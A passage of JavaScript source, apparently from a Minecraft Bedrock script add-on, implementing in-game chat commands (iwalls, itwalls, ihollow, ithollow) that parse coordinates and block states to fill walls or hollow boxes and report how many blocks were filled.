                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^iwalls$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? [undefined, undefined] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    system.run(() => { try {
                        let startTime = Date.now();
                        let a = fillBlocksHW(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                        let endTime = Date.now();
                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    } });
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^itwalls$/):
                {
                    eventData.cancel = true;
                    let argsa = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "string"]);
                    let args = argsa.args;
                    let argsaextra = argsa.extra;
                    let coordinatesa = evaluateCoordinates(args[1], args[2], args[3], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(args[4], args[5], args[6], player.location, player.getRotation());
                    //let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1
                    //let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex)
                    let firstblockname = args[7];
                    let firstblockstates = argsa.extra.trimStart().startsWith("{") ? JSONParse(extractJSONStrings(argsa.extra.trimStart(), false)[0]) : argsa.extra.trimStart().startsWith("[") ? JSONParse(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = argsa.extra.trimStart().startsWith("{") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart(), false)[0].length).trimStart().split(" ")[0] : argsa.extra.trimStart().startsWith("[") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : argsa.extra.trimStart().split(" ")[0];
                    let somethingtest = argsa.extra.trimStart().startsWith("{") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : argsa.extra.trimStart().startsWith("[") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : argsa.extra.trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? [undefined, undefined] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates];
                    console.warn(JSONStringify({ coordinatesa, coordinatesb, firstblockname, argsaextra, args /*, firstblocknameindex, reststringaftercoordinates*/, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock }));
                    system.run(() => { let ta; try {
                        let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                        player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                        ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                        system.runTimeout(() => { try {
                            let startTime = Date.now();
                            let a = fillBlocksHW(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                            let endTime = Date.now();
                            player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                        }
                        catch (e) {
                            eventData.sender.sendMessage("§c" + e + e.stack);
                        }
                        finally {
                            ta?.remove();
                        } }, 2);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    } });
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^ihollow$/):
                {
                    eventData.cancel = true;
                    let coordinatesa = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation());
                    let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index + Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ") + 1;
                    let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex);
                    let firstblockname = reststringaftercoordinates.split(" ")[0];
                    let firstblockstates = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0]) : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? JSONParse(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ")[0];
                    let somethingtest = reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("{") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().startsWith("[") ? reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().slice(extractJSONStrings(reststringaftercoordinates.split(" ").slice(1).join(" ").trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : reststringaftercoordinates.trimStart().split(" ").slice(1).join(" ").trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? [undefined, undefined] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates]; /*
                    console.warn(JSONStringify({coordinatesa, coordinatesb, firstblockname, firstblocknameindex, reststringaftercoordinates, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock}))*/
                    system.run(() => { try {
                        let startTime = Date.now();
                        let a = fillBlocksHH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                        let endTime = Date.now();
                        player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                    }
                    catch (e) {
                        eventData.sender.sendMessage("§c" + e + e.stack);
                    } });
                    //            try{system.run(()=>{player.dimension.fillBlocks(evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[0][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[1][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[2][0], player.location, player.getRotation()), evaluateCoordinates(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[3][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[4][0], Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0], player.location, player.getRotation()), mcServer.BlockPermutation.resolve(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1).split(" ")[0], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[0]), {matchingBlock: mcServer.BlockPermutation.resolve(getParametersFromString(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1)).results[2], extractJSONStrings(switchTestB.split(" ").slice(1).join(" ").slice(Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")).split(" ").slice(1).join(" "), false)[1])}); }); }catch(e){eventData.sender.sendMessage("§c" + e + e.stack)}
                }
                break;
            case !!switchTest.match(/^ithollow$/):
                {
                    eventData.cancel = true;
                    let argsa = evaluateParameters(switchTestB, ["presetText", "Vector", "Vector", "Vector", "Vector", "Vector", "Vector", "string"]);
                    let args = argsa.args;
                    let argsaextra = argsa.extra;
                    let coordinatesa = evaluateCoordinates(args[1], args[2], args[3], player.location, player.getRotation());
                    let coordinatesb = evaluateCoordinates(args[4], args[5], args[6], player.location, player.getRotation());
                    //let firstblocknameindex = Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5].index+Array.from(switchTestB.split(" ").slice(1).join(" ").matchAll(/\s*([\^\*\~\!][\-]?\d*|(?<![\^\*\~\!\d])[\-]?\d+)\s*/gis))[5][0].indexOf(" ")+1
                    //let reststringaftercoordinates = switchTestB.split(" ").slice(1).join(" ").slice(firstblocknameindex)
                    let firstblockname = args[7];
                    let firstblockstates = argsa.extra.trimStart().startsWith("{") ? JSONParse(extractJSONStrings(argsa.extra.trimStart(), false)[0]) : argsa.extra.trimStart().startsWith("[") ? JSONParse(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let lastblockname = argsa.extra.trimStart().startsWith("{") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart(), false)[0].length).trimStart().split(" ")[0] : argsa.extra.trimStart().startsWith("[") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ")[0] : argsa.extra.trimStart().split(" ")[0];
                    let somethingtest = argsa.extra.trimStart().startsWith("{") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart(), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : argsa.extra.trimStart().startsWith("[") ? argsa.extra.trimStart().slice(extractJSONStrings(argsa.extra.trimStart().replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0].length).trimStart().split(" ").slice(1).join(" ").trim() : argsa.extra.trimStart().split(" ").slice(1).join(" ").trim();
                    let lastblockstates = somethingtest.startsWith("{") ? JSONParse(extractJSONStrings(somethingtest, false)[0]) : somethingtest.startsWith("[") ? JSONParse(extractJSONStrings(somethingtest.replaceAll("=", ":").replaceAll("[", "{").replaceAll("]", "}"), false)[0]) : undefined;
                    let matchingblock = lastblockname == "" ? [undefined, undefined] : lastblockname == "keep" ? ["air"] : [lastblockname, lastblockstates];
                    console.warn(JSONStringify({ coordinatesa, coordinatesb, firstblockname, argsaextra, args /*, firstblocknameindex, reststringaftercoordinates*/, firstblockstates, lastblockname, somethingtest, lastblockstates, matchingblock }));
                    system.run(() => { let ta; try {
                        let location = { x: (coordinatesa.x + coordinatesb.x) / 2, y: (coordinatesa.y + coordinatesb.y) / 2, z: (coordinatesa.z + coordinatesb.z) / 2 };
                        player.dimension.runCommand("summon andexdb:tickingarea_6 itwalls " + vTStr(location));
                        ta = player.dimension.getEntitiesAtBlockLocation(location).find(v => v.typeId == "andexdb:tickingarea"); /*console.warn(ta, location); */
                        system.runTimeout(() => { try {
                            let startTime = Date.now();
                            let a = fillBlocksHH(coordinatesa, coordinatesb, player.dimension, firstblockname, firstblockstates, { matchingBlock: matchingblock[0], matchingBlockStates: matchingblock[1] });
                            let endTime = Date.now();
                            player.sendMessage(`${a == 0 ? "§c" : ""}${a} blocks filled in ${endTime - startTime} ms`);
                        }
                        catch (e) {
